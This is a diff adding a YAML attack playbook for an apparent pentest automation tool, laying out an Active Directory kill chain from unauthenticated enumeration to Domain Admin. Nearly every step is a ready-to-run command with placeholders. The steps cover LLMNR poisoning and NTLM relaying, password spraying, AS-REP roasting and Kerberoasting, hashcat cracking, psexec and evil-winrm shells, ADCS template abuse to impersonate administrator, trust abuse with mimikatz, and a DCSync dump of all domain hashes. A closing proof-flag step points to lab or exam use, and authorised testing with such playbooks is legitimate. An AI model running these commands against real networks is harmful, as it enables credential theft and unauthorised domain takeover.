@@ -1,0 +1,179 @@
+name: ad-kill-chain
+display_name: "AD Kill Chain Comprehensive"
+description: "Advanced Active Directory attack methodology — from unauthenticated enum to DCSync and Domain Admin"
+
+applicable_when:
+  ports: [88, 135, 139, 389, 445, 636, 3268]
+  services: ["kerberos", "ldap", "smb", "rpc"]
+
+steps:
+  - id: network-poisoning
+    name: "Network Poisoning & Relaying"
+    phase: initial-access
+    description: "Listen for LLMNR/NBT-NS/mDNS broadcasts and relay hashes or crack them offline"
+    commands:
+      - "sudo responder -I {INTERFACE} -dwP"
+      - "impacket-ntlmrelayx -tf targets.txt -smb2support"
+      - "impacket-ntlmrelayx -t ldap://{IP} --escalate-user {USER}"
+    check:
+      network_poisoning_active: true
+
+  - id: null-enum
+    name: "Null / Guest Enumeration"
+    phase: recon
+    description: "Attempt null and guest sessions on SMB/RPC/LDAP for domain info"
+    commands:
+      - "capo nxc null"
+      - "capo nxc guest"
+      - "rpcclient -U '' -N {IP}"
+      - "ldapsearch -x -H ldap://{IP} -b '' -s base namingContexts"
+    check:
+      ports_min: 3
+
+  - id: smb-shares-anon
+    name: "Anonymous SMB Share Enumeration"
+    phase: recon
+    description: "Hunt for readable shares that might contain passwords, scripts, or GPP"
+    commands:
+      - "capo nxc smb-shares-anon"
+      - "smbclient -N -L //{IP}"
+      - "smbmap -H {IP} -u '' -p ''"
+    check:
+      shares_readable: true
+
+  - id: user-enum
+    name: "User Enumeration"
+    phase: recon
+    description: "Gather domain usernames via RID brute, LDAP, or Kerberos"
+    commands:
+      - "capo nxc rid-brute"
+      - "capo nxc ldap-enum"
+      - "kerbrute userenum -d {DOMAIN} --dc {IP} users.txt"
+    check:
+      users_min: 1
+
+  - id: password-spray
+    name: "Initial Password Spraying"
+    phase: credential-access
+    description: "Spray common passwords (or user=pass) across discovered valid accounts"
+    commands:
+      - "capo query spray-common"
+      - "nxc smb {IP} -u users.txt -p 'Welcome1!' --continue-on-success"
+      - "nxc smb {IP} -u users.txt -p users.txt --no-bruteforce"
+    check:
+      credentials_min: 1
+
+  - id: asrep-roast
+    name: "AS-REP Roasting"
+    phase: credential-access
+    description: "Find accounts without Kerberos pre-authentication"
+    commands:
+      - "capo query asrep-roast"
+      - "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {IP} -format hashcat"
+    check:
+      hashes_min: 1
+
+  - id: kerberoast
+    name: "Kerberoasting"
+    phase: credential-access
+    description: "Request TGS tickets for service accounts and crack offline"
+    commands:
+      - "capo query kerberoast"
+      - "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASSWORD} -dc-ip {IP} -request"
+    check:
+      tgs_hashes_min: 1
+
+  - id: crack-hashes
+    name: "Crack Hashes"
+    phase: credential-access
+    description: "Crack captured AS-REP or TGS hashes with hashcat"
+    commands:
+      - "hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt"
+      - "hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt"
+    check:
+      credentials_min: 1
+
+  - id: smb-shares-auth
+    name: "Authenticated SMB Hunting"
+    phase: discovery
+    description: "Crawl shares with valid credentials to find sensitive files"
+    commands:
+      - "capo nxc smb-spider {USER} {PASSWORD}"
+      - "nxc smb {IP} -u {USER} -p '{PASSWORD}' --shares"
+      - "snaffler.exe -s -d {DOMAIN} -o snaffler.log" # Assume running from a Windows pivot or via mono
+
+  - id: cred-test
+    name: "Lateral Movement / Execution"
+    phase: lateral-movement
+    description: "Verify local admin rights and get interactive shells"
+    commands:
+      - "capo nxc check-admin {USER} {PASSWORD}"
+      - "nxc smb {IP} -u {USER} -p '{PASSWORD}' --local-auth"
+      - "evil-winrm -i {IP} -u {USER} -p '{PASSWORD}'"
+      - "impacket-psexec {DOMAIN}/{USER}:'{PASSWORD}'@{IP}"
+      - "impacket-wmiexec {DOMAIN}/{USER}:'{PASSWORD}'@{IP}"
+    check:
+      shells_active: 1
+
+  - id: bloodhound
+    name: "BloodHound Collection"
+    phase: discovery
+    description: "Map AD relationships for privilege escalation paths"
+    commands:
+      - "capo query bloodhound"
+      - "bloodhound-python -u {USER} -p '{PASSWORD}' -d {DOMAIN} -ns {IP} -c all"
+      - "nxc ldap {IP} -u {USER} -p '{PASSWORD}' --bloodhound -c all"
+    check:
+      bloodhound_data: true
+
+  - id: adcs-enum
+    name: "ADCS Enumeration"
+    phase: discovery
+    description: "Find vulnerable Certificate Templates (ESC1-ESC14)"
+    commands:
+      - "certipy find -u {USER}@{DOMAIN} -p '{PASSWORD}' -dc-ip {IP} -vulnerable -stdout"
+      - "nxc ldap {IP} -u {USER} -p '{PASSWORD}' -M adcs"
+    check:
+      adcs_vuln_found: true
+
+  - id: privesc-domain
+    name: "Domain Privilege Escalation"
+    phase: privilege-escalation
+    description: "Execute paths found in BloodHound or ADCS to compromise Domain Admin"
+    commands:
+      - "certipy req -u {USER}@{DOMAIN} -p '{PASSWORD}' -ca {CA_NAME} -template {TEMPLATE} -upn administrator@{DOMAIN} -target {IP}"
+      - "impacket-getST -spn cifs/{IP} -impersonate Administrator {DOMAIN}/{USER}:'{PASSWORD}'"
+    check:
+      da_credentials: true
+
+  - id: cross-domain-trusts
+    name: "Cross-Forest & Domain Trust Abuse"
+    phase: privilege-escalation
+    description: "Map trusts, forge inter-realm tickets (SID History), and relay across boundaries"
+    commands:
+      - "capo query powerview-trusts  # Map trusts using PowerView"
+      - "nxc smb {IP} -u {USER} -p '{PASSWORD}' --trusts"
+      - "impacket-getST -spn cifs/{TRUST_DC_IP} -impersonate Administrator -dc-ip {IP} {DOMAIN}/{USER}:'{PASSWORD}'"
+      - "mimikatz 'lsadump::trust /patch'"
+    check:
+      trusts_enumerated: true
+
+  - id: dcsync
+    name: "DCSync & NTDS Dump"
+    phase: post-exploitation
+    description: "Dump all domain hashes using DA privileges"
+    commands:
+      - "impacket-secretsdump {DOMAIN}/{USER}:'{PASSWORD}'@{IP}"
+      - "nxc smb {IP} -u {USER} -p '{PASSWORD}' --ntds"
+    check:
+      ntds_dumped: true
+
+  - id: flags
+    name: "Capture Flags"
+    phase: post-exploitation
+    description: "Grab proof files from target"
+    commands:
+      - "type C:\\Users\\Administrator\\Desktop\\proof.txt"
+      - "cat /root/proof.txt"
+    check:
+      flags: true
